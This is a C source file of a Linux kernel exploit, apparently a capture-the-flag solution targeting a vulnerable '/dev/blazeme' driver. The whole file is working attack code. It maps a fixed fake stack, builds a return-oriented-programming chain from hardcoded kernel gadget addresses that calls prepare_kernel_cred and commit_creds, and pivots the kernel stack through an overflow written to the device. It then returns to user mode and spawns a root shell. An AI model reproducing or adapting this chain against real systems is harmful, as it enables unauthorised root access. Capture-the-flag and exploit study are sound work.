// gcc -o krop krop.c -masm=intel -static


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>


int __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);


unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;


static void save_state(void)
{
    __asm__ volatile(
            "movq %0, cs\n\t"
            "movq %1, ss\n\t"
            "pushfq\n\t"
            "popq %2\n\t"
            : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags)
            :
            : "memory"
            );
}


void shell(void)
{
    printf("Spwan shell!\n");
    system("/bin/sh");
}


unsigned long addr_fake_stack = 0x1740000;
unsigned long mmap_addr = 0x1700000;


int main(void)
{
    commit_creds = (void *)0xffffffff81063960ULL;
    prepare_kernel_cred = (void *)0xffffffff81063b50ULL;
    save_state();

    unsigned long *fake_stack = mmap((void *)mmap_addr, 0x100000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x32 | MAP_POPULATE | MAP_FIXED, -1, 0);

    if (!fake_stack) {
        printf("mmap failed\n");
        return 1;
    }

    fake_stack += (addr_fake_stack - mmap_addr) / sizeof(unsigned long);

    *fake_stack ++= 0xffffffff811664ccUL; // pop rdi; ret
    *fake_stack ++= 0UL; // NULL
    *fake_stack ++= (unsigned long)prepare_kernel_cred;

    *fake_stack ++= 0xffffffff81148e10UL; //pop rdx; ret
    *fake_stack ++= (unsigned long)(commit_creds + 2);
    *fake_stack ++= 0xffffffff81085026UL; //mov rdi, rax ; call rdx ;

    *fake_stack ++= 0xffffffff8103b904UL; // swapgs ; pop rbp; ret;
    *fake_stack ++= 0xdeadbeafUL; // pad

    *fake_stack ++= 0xffffffff8101cf06; // iretq
    *fake_stack ++= (unsigned long)shell;
    *fake_stack ++= user_cs;
    *fake_stack ++= user_rflags;
    *fake_stack ++= (addr_fake_stack + 0x8000);
    *fake_stack ++= user_ss;

    unsigned long pivot[8];
    int i;
    for (i = 0; i < 8; ++i) {
        pivot[i] = 0xffffffff8109c604ULL;  // mov esp, 0x1740000; ret;
    }

    char payload[128] = "AA";
    memcpy(payload + 2, (const void *)pivot, 64);

    int fd = open("/dev/blazeme", O_RDWR);
    while (1) {
        write(fd, payload, 64);
    }

    return 0;
}
